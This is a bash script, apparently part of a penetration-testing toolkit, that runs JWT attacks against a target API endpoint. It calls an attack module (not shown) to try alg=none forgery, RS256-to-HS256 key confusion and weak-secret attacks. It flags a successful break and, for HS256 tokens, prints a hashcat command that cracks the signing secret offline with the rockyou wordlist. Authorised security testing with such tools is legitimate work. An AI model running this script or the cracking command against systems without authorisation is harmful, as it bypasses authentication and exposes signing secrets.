#!/usr/bin/env bash
# vuln/jwt.sh — JWT attacks (alg=none, RS256→HS256 confusion, weak secret).
#
# Inputs:
#   TOKEN     — the JWT to test
#   ENDPOINT  — URL that accepts the token via Authorization: Bearer
#   PUB_KEY   — (optional) path to the server's RS256 public key PEM

PHASE="jwt"
. "$(dirname "$0")/_lib.sh"
require_target
OUTDIR=$(out_dir "$PHASE")

if [ -z "${TOKEN:-}" ]; then
    log ERR "TOKEN required (JWT to test)"
    exit 2
fi
ENDPOINT="${ENDPOINT:-https://$TARGET/api/me}"

# Use the in-app primitive (attack/jwt.py) for the actual probes — it
# handles the encoding correctly and surfaces structured AttackResult.
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
export TOKEN ENDPOINT TARGET
[ -n "${PUB_KEY:-}" ] && export PUB_KEY
python3 - >"$OUTDIR/result.json" 2>&1 <<PY
import json, sys, os
sys.path.insert(0, "$REPO_ROOT")
from attack import jwt as jwt_mod

opts = {
    "token":    os.environ["TOKEN"],
    "endpoint": os.environ["ENDPOINT"],
}
pk = os.environ.get("PUB_KEY", "")
if pk and os.path.exists(pk):
    with open(pk) as f:
        opts["public_key"] = f.read()

result = jwt_mod.run(os.environ.get("TARGET", ""), opts)
print(json.dumps(result.to_dict(), indent=2))
PY

# Surface the headline
if grep -q '"success": true' "$OUTDIR/result.json" 2>/dev/null; then
    log INFO "JWT BROKEN — see $OUTDIR/result.json"
    grep -E '"summary"|"confidence"' "$OUTDIR/result.json" | sed 's/^[[:space:]]*//'
else
    log INFO "no JWT break — see $OUTDIR/result.json for probe details"
fi

# Weak-secret advisory
header=$(echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null || echo "{}")
if echo "$header" | grep -qi 'HS256'; then
    log INFO "HS256 token — offline crack advisable:"
    log INFO "  echo $TOKEN > token.txt && hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt"
fi
